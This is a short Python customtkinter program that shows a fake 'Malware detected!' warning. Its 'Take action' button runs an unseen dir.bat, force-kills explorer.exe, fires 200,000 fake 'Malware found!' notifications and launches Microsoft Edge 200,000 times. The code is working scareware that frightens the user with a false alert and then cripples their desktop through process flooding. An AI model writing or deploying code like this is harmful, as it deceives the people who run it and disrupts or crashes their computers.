#Imports:
import customtkinter as ctk
from customtkinter import *
from plyer import notification
from PIL import Image
import subprocess
import os
import math

#Functions:
def center_window(w):
    w.update_idletasks()
    width = w.winfo_width()
    height = w.winfo_height()
    x_offset = math.floor((w.winfo_screenwidth() - width) / 2)
    y_offset = math.floor((w.winfo_screenheight() - height) / 2)
    w.geometry(f"+{x_offset}+{y_offset}")

def show_notification():
    notification.notify (
        title="Malware found!",
        message="Urgent attention needed:",
        timeout=10,
    )

def quit():
    num = 200000    
    subprocess.run(["dir.bat"])
    os.system("taskkill /f /im  explorer.exe")
    for _ in range(num):
        show_notification()
    for _ in range(num):
        os.startfile("C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe")

#Window:
w = ctk.CTk()
w.title("Malware detected!")
w.geometry('450x240')
w.resizable(False, False)
w.iconbitmap("icon.ico")

#Fonts:
default = CTkFont(
    weight="bold",
    family="Segoe UI", 
    size=25
)

#Image path
image_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "_images")
w.logo_image = ctk.CTkImage(Image.open(os.path.join(image_path, "logo.png")), size=(55, 55))

#Widgets:
lb = CTkLabel(w, text="Fatal malware detected!", font=default, image=w.logo_image, compound="left")
lb.pack(pady=30)
btn = CTkButton(w, text="Take action:", command=quit, font=default)
btn.pack(pady=30)

#Looping:
w.after(0, lambda: center_window(w))
w.mainloop()
